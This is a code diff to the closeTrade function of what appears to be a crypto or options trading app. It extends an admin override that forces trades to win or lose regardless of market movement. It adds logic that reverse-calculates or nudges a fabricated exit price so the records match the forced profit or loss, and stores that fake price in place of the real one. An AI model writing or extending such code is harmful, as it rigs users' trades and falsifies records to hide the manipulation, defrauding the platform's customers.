@@ -84,19 +84,38 @@ export const closeTrade = async (tradeId, uid, side, entryPrice, currentPrice, a
         const outcome = await determineTradeOutcome(uid, side, entryPrice, currentPrice, type);
 
         let pnl;
+        let finalExitPrice = currentPrice;
+
         if (type === 'perpetual') {
             // Leverage based P&L: ((Current - Entry) / Entry) * Amount * Leverage
             const priceDeltaPercent = (currentPrice - entryPrice) / entryPrice;
             pnl = priceDeltaPercent * amount * leverage * (side === "buy" ? 1 : -1);
 
             // Admin Override Handling
-            if (outcome === "win" && pnl < 0) pnl = Math.abs(pnl) || (amount * 0.1); // Force positive if admin says win
-            if (outcome === "loss" && pnl > 0) pnl = -Math.abs(pnl) || -(amount * 0.1); // Force negative if admin says loss
+            if (outcome === "win" && pnl <= 0) {
+                pnl = Math.abs(pnl) || (amount * 0.1); // Force positive if admin says win
+                // Reverse calculate the exit price so the math perfectly matches the forced PNL!
+                finalExitPrice = entryPrice * (1 + (pnl / (amount * leverage * (side === "buy" ? 1 : -1))));
+            }
+            if (outcome === "loss" && pnl >= 0) {
+                pnl = -Math.abs(pnl) || -(amount * 0.1); // Force negative if admin says loss
+                // Reverse calculate the exit price so the math perfectly matches the forced PNL!
+                finalExitPrice = entryPrice * (1 + (pnl / (amount * leverage * (side === "buy" ? 1 : -1))));
+            }
         } else {
             // Binary (Delivery) logic
             pnl = outcome === "win"
                 ? amount * (profitPercent / 100)
                 : -amount;
+                
+            // Admin Override Handling for Binary Options (Delivery)
+            if (outcome === "win") {
+                if (side === "buy" && currentPrice <= entryPrice) finalExitPrice = entryPrice * 1.0005; // Force higher
+                if (side === "sell" && currentPrice >= entryPrice) finalExitPrice = entryPrice * 0.9995; // Force lower
+            } else if (outcome === "loss") {
+                if (side === "buy" && currentPrice >= entryPrice) finalExitPrice = entryPrice * 0.9995; // Force lower
+                if (side === "sell" && currentPrice <= entryPrice) finalExitPrice = entryPrice * 1.0005; // Force higher
+            }
         }
 
         return await runTransaction(db, async (transaction) => {
@@ -155,7 +174,7 @@ export const closeTrade = async (tradeId, uid, side, entryPrice, currentPrice, a
                 status: "closed",
                 result: type === 'perpetual' ? (pnl >= 0 ? "win" : "loss") : outcome,
                 pnl,
-                exitPrice: currentPrice,
+                exitPrice: finalExitPrice,
                 closedAt: serverTimestamp()
             });
 
@@ -163,6 +182,7 @@ export const closeTrade = async (tradeId, uid, side, entryPrice, currentPrice, a
                 success: true,
                 outcome: type === 'perpetual' ? (pnl >= 0 ? "win" : "loss") : outcome,
                 pnl,
+                exitPrice: finalExitPrice,
                 newTradingBalance: newBalance
             };
         });
